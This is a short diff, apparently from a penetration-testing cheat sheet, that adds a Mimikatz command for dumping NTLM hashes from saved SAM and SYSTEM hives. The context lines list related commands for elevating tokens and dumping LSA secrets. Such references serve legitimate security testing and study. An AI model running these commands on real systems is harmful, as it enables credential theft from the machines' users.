@@ -2066,8 +2066,9 @@ token::elevate
 # list available tokens (= logged in users)
 token::list
 
-# dump hashes from SAM
+# dump hashes from SAM / dump NTLM hashes
 lsadump::sam
+lsadump::sam /system:SYSTEM /sam:SAM
 
 # dump secrets
 lsadump::secrets
